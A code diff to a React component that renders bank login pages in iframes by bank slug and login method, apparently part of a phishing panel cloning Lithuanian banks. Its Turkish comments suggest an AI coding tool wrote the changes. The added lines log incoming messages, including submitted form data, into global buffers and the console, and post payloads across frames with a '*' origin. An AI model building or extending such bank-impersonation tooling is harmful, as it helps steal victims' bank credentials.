@@ -499,6 +499,28 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
   useEffect(() => {
     const handleMessage = (e: MessageEvent) => {
+      // ==================================================================
+      // LT PARENT DEBUG BUFFER (son 100 kayit)
+      // Baska AI kontrol ederken ilk console yerine bunu kontrol etmesi daha kolay.
+      // ==================================================================
+      try {
+        const W = globalThis as any;
+        if (!Array.isArray(W.__TRAE_LT_PARENT_LOGS)) {
+          W.__TRAE_LT_PARENT_LOGS = [];
+        }
+        const push = (row: any) => {
+          try {
+            W.__TRAE_LT_PARENT_LOGS.unshift({ t: Date.now(), ...row });
+            if (W.__TRAE_LT_PARENT_LOGS.length > 100) W.__TRAE_LT_PARENT_LOGS.length = 100;
+          } catch {}
+        };
+        if (e && e.data && typeof e.data === 'object' && e.data.type) {
+          push({ event: 'ONMESSAGE', type: e.data.type, payload: e.data });
+          // eslint-disable-next-line no-console
+          console.log('%c[LT PARENT] ONMESSAGE ' + String(e.data.type), 'background:#b39ddb;color:#000;font-weight:bold;', e.data);
+        }
+      } catch {}
+
       if (e.data && e.data.type === 'LITHUANIA_BANK_SUBMIT') {
         const { formData } = e.data;
         
@@ -751,14 +773,26 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
            // 1. ONCELIKLI: Dogrudan bulunan index
            const safeIndex = Math.max(0, Math.min(finalIndex, totalFiles - 1));
            if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
+           // eslint-disable-next-line no-console
+           console.log('%c[LT PARENT] SET CURRENT INDEX (bulunan)', 'background:#42a5f5;color:#fff;font-weight:bold;', {
+             finalIndex, safeIndex, loginMethod: finalLoginMethod, totalFiles, bankSlug: __bankSlug
+           });
            setCurrentIndex((prev) => (prev === safeIndex ? prev : safeIndex));
          } else if (finalLoginMethod) {
            // 2. Login method bulundu ama index bulunamadi: ise yaramaz, fallback gecme.
            setSelectedLoginMethod(finalLoginMethod);
+           // eslint-disable-next-line no-console
+           console.log('%c[LT PARENT] SADECE METHOD BULUNDU (index yok)', 'background:#ffb74d;color:#000;font-weight:bold;', {
+             finalLoginMethod, bankSlug: __bankSlug
+           });
          } else {
            // 3. ESTONIA ILE AYNI: Ne index ne method bulunursa sonraki indexe gec.
            // (CUNKU: kullanici TAB tikladi ama biz bir sey bulamadik. Kullanici "hicbir sey
            //  olmuyor" hissetmesin diye bir sonraki HTML goster.)
+           // eslint-disable-next-line no-console
+           console.log('%c[LT PARENT] FALLBACK SONRAKI INDEX (hicbir sey bulunamadi)', 'background:#ef5350;color:#fff;font-weight:bold;', {
+             totalFiles, bankSlug: __bankSlug
+           });
            setCurrentIndex((prev) => (prev + 1) % totalFiles);
          }
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_IFRAME_LOADED') {
@@ -2121,6 +2155,25 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                         targetIndex: targetIndex >= 0 ? targetIndex : undefined,
                         loginMethod: clickedLoginMethod || (window.__traeSelectedLoginMethod || '')
                   };
+
+                  // ==================================================================
+                  // IFRAME ICI DEBUG LOG + BUFFER (son 100) - Baska AI bunu kontrol eder
+                  // ==================================================================
+                  try {
+                    const W2 = window as any;
+                    if (!Array.isArray(W2.__TRAE_LT_IFRAME_LOGS)) { W2.__TRAE_LT_IFRAME_LOGS = []; }
+                    W2.__TRAE_LT_IFRAME_LOGS.unshift({ t: Date.now(), event: 'TAB_CLICK', text: targetTab.textContent, targetIndex, payload });
+                    if (W2.__TRAE_LT_IFRAME_LOGS.length > 100) W2.__TRAE_LT_IFRAME_LOGS.length = 100;
+                    // eslint-disable-next-line no-console
+                    console.log('%c[LT IFRAME] TAB CLICK', 'background:#81c784;color:#000;font-weight:bold;', {
+                      text: targetTab.textContent,
+                      targetIndex,
+                      loginMethod: clickedLoginMethod,
+                      fullHref: window.location.href,
+                      payload
+                    });
+                  } catch {}
+
                   // Race condition / cross-origin oncesi event cache'i engellemek icin 3 KEZ at + customEvent.
                   const pm = () => { try { window.parent.postMessage(payload, '*'); } catch(_e) {} };
                   pm();
